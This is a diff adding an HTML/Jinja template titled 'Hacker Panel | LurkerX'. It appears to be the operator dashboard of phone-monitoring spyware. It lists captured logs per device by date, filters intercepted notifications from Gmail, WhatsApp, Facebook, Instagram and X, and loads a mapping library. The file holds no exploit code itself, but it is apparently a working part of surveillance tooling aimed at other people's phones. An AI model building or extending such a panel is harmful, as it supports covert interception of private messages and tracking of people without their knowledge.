@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+body {
+  margin: 0;
+  font-family: "Consolas", "Fira Code", "Segoe UI", monospace;
+  background: #0f172a; /* dark slate */
+  color: #d1d5db; /* soft gray */
+  display: flex;
+  height: 100vh;
+}
+
+/* Sidebar */
+.sidebar {
+  min-width: 200px;
+  background: #111827; /* near-black */
+  color: #f9fafb;
+  overflow-y: auto;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  border-right: 1px solid #1f2937;
+}
+.sidebar h2 {
+  font-size: 1.2rem;
+  margin-bottom: 15px;
+  color: #10b981; /* neon green accent */
+}
+.sidebar summary {
+  cursor: pointer;
+  padding: 6px 8px;
+  border-radius: 6px;
+  transition: background 0.2s;
+}
+.sidebar summary:hover {
+  background: rgba(16, 185, 129, 0.2); /* green tint */
+}
+.sidebar a {
+  display: block;
+  padding: 5px 10px;
+  color: #38bdf8; /* cyan accent */
+  text-decoration: none;
+  border-radius: 4px;
+  transition: background 0.2s;
+}
+.sidebar a:hover {
+  background: rgba(56, 189, 248, 0.15);
+}
+
+/* Main content */
+.main {
+  flex: 1;
+  padding: 20px;
+  overflow-y: auto;
+}
+.main h1 {
+  margin-top: 0;
+  font-size: 1.5rem;
+  color: #facc15; /* yellow headline */
+}
+
+/* Board container */
+.board-content {
+  background: #1e293b;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.6);
+  margin-top: 15px;
+  min-height: 60vh;
+  overflow-y: auto;
+  color: #e5e7eb;
+  font-size: 0.95rem;
+}
+
+.filter-buttons {
+  margin-top: 15px;
+  display: flex;
+  gap: 3px;
+  flex-wrap: wrap;
+}
+.filter-buttons button {
+  padding: 8px 14px;
+  border: none;
+  border-radius: 6px;
+  background: #2563eb;
+  color: #000;
+  cursor: pointer;
+  font-size: 0.9rem;
+  transition: background 0.2s;
+  color: #fff;
+}
+.filter-buttons button:hover {
+  background: #1e40af;
+}
+.wa-btn { background: #25d366 !important; color: #000; }
+.wa-btn:hover { background: #128c7e !important; }
+.x-btn { background: #1da1f2 !important; }
+.x-btn:hover { background: #0d8ddb !important; }
+.ig-btn { background: #e1306c !important; }
+.ig-btn:hover { background: #a50e3c !important; }
+.gm-btn { background: #d93025 !important; }
+.gm-btn:hover { background: #a52714 !important; }
+
+/* Modal */
+.modal-content {
+  background: #1f2937;
+  color: #e5e7eb;
+  border: 1px solid #374151;
+}
+
+/* Spinner */
+.spinner {
+  border: 4px solid #1f2937;
+  border-top: 4px solid #10b981; /* neon hacker green */
+}
+
+/* Links / triggers */
+.view-trigger {
+  cursor: pointer;
+  color: #22d3ee;
+}
+.view-trigger:hover {
+  color: #06b6d4;
+}
+  </style>
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+</head>
+
+<body>
+  <div class="sidebar" id="sidebar">
+    <h2>🤡 Hacker Panel</h2>
+    {% block sidebar %}
+    <ul>
+      {% for device, years in structure.items()|reverse %}
+      <li>
+        <details>
+          <summary>📱 {{ device }}</summary>
+          <ul>
+            {% for year, months in years.items()|reverse %}
+            <li>
+              <details>
+                <summary>{{ year }}</summary>
+                <ul>
+                  {% for month, days in months.items()|reverse %}
+                  <li>
+                    <details>
+                      <summary>{{ month }}</summary>
+                      <ul>
+                        {% for day, files in days.items()|reverse %}
+                        <li>
+                          <details>
+                            <summary>{{ day }}</summary>
+                            <ul>
+                              {% for file in files|reverse %}
+                              <li>
+                                <a class="view-trigger"
+                                  onclick="loadToBoard('{{ url_for('logs', filename=device ~ '/' ~ year ~ '/' ~ month ~ '/' ~ day ~ '/' ~ file) }}', '{{ file }}')">
+                                  📄 {{ file.replace('.json', '') }}
+                                </a>
+                              </li>
+                              {% endfor %}
+                            </ul>
+                          </details>
+                        </li>
+                        {% endfor %}
+                      </ul>
+                    </details>
+                  </li>
+                  {% endfor %}
+                </ul>
+              </details>
+            </li>
+            {% endfor %}
+          </ul>
+        </details>
+      </li>
+      {% endfor %}
+    </ul>
+
+    {% endblock %}
+  </div>
+
+  <div class="main">
+    {% block content %}{% endblock %}
+
+    <h2>Popular apps</h2>
+    <div class="filter-buttons">
+      <button class="gm-btn" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
+      <button onclick="filterNotifications('com.facebook.katana')">Facebook</button>
+      <button class="wa-btn" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
+      <button onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
+      <button class="ig-btn" onclick="filterNotifications('com.instagram.android')">Instagram</button>
+      <button class="x-btn" onclick="filterNotifications('com.twitter.android')">X (Twitter)</button>
+    </div>
+    <hr>
+
+    <div id="board-content" class="board-content">
+      <p>👈 Select a log from the sidebar to view its details here.</p>
+    </div>
+  </div>
+
+  <div class="spinner-container">
+    <div class="spinner" id="spinner"></div>
+  </div>
+  <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+
+</html>
